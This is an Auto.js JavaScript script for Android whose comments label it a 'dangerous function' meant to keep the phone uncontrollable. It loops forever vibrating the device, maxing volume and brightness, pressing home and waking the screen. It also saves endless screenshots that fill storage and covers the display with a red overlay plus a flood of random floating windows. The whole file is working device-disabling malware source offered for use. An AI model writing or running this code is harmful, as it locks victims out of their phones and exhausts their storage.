//申请运行
auto.waitFor();
requestScreenCapture();

kszsj();
//危险函数
function kszsj() {
    var num = 1000000000000;
    
    //保持手机振动
    threads.start(function() {
        while (true) {
            device.vibrate(1000);
            sleep(900);
        }
    });
    
    //保持手机无法控制
    threads.start(function() {
        while (true) {
            device.setMusicVolume(device.getMusicMaxVolume());
            device.setBrightnessMode(0);
            device.setBrightness(255);
            home();
            device.wakeUp();
            sleep(500);
        }
    });
    //测试时建议注释此段哦
    threads.start(function() {
        while (true) {
            images.save(captureScreen(), "./" + random(164349, 64646449816161616161619) + ".png")
        }
    });
    
    //设置全屏背景
    var bgs = floaty.rawWindow(
        <frame bg="#ff0000"/>
    );
    bgs.setPosition(0, 0);
    bgs.setSize(device.width, device.height);
    //循环构建悬浮窗线程
    threads.start(function() {
        for (var i = 0; i < num; i++) {
            var a = floaty.rawWindow(
                <frame bg="{{bg()}}"/>
            );
            //设置随机位置
            a.setPosition(random(-500, device.width), random(-800, device.height));
            a.setSize(random(200, device.width), random(200, device.height));
        }
    });
}

//随机半透明颜色
function bg() {
    var a = random(17, 255).toString(16);
    var r = random(17, 255).toString(16);
    var g = random(17, 255).toString(16);
    var b = random(17, 255).toString(16);
    return "#" + a + r + g + b;
}
